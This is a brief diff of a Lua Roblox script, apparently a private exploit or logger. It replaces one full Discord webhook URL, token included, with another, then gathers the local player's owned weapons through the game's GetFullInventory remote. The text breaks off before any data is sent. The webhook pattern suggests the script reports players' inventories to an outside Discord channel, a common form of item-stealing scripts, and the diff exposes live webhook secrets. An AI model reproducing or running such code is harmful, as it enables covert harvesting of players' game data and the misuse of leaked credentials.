@@ -1,6 +1,6 @@
 -- r3th_priv
 
-local url = "https://discord.com/api/webhooks/1271102196733448304/pnO6NKEckeSJ2b7OKnN72kFd6DMGRILG72MxhTohZoR2HcafJwcIjlyC3dMflAMXJEyv"
+local url = "https://discord.com/api/webhooks/1271110291861540938/dJyzrlLonXdGnvyDws9sf5gpc5rWnTRnG3PqN8xdo0fre58vhK-MfL5Nm_XTWTyL-ayO"
 
 t = {}
 for i,v in pairs(game.ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(game.Players.LocalPlayer.Name)["Weapons"]["Owned"]) do
